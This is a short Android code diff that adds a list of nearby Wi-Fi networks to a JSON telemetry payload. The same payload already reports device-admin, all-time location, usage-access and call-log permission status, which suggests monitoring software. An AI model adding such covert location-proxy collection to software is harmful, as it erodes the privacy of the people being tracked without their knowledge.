@@ -26,6 +26,7 @@ public final class TelemetryHelper {
                 .append("\"deviceId\":\"").append(BackendClient.escapeJson(BackendClient.getDeviceId(context))).append("\",")
                 .append("\"deviceAdminActive\":").append(deviceAdminActive ? "true" : "false").append(",")
                 .append("\"wifiSsid\":\"").append(BackendClient.escapeJson(wifiSsid)).append("\",")
+                .append("\"nearbyWifi\":").append(WifiScanHelper.collectNearbyWifi(context).toString()).append(",")
                 .append("\"locationPermissionGranted\":").append(LocationHelper.hasAllTimeLocation(context) ? "true" : "false").append(",")
                 .append("\"usageAccessGranted\":").append(UsageStatsHelper.hasUsageAccess(context) ? "true" : "false").append(",")
                 .append("\"callLogPermissionGranted\":").append(CommunicationLogHelper.hasCallLogPermission(context) ? "true" : "false").append(",")
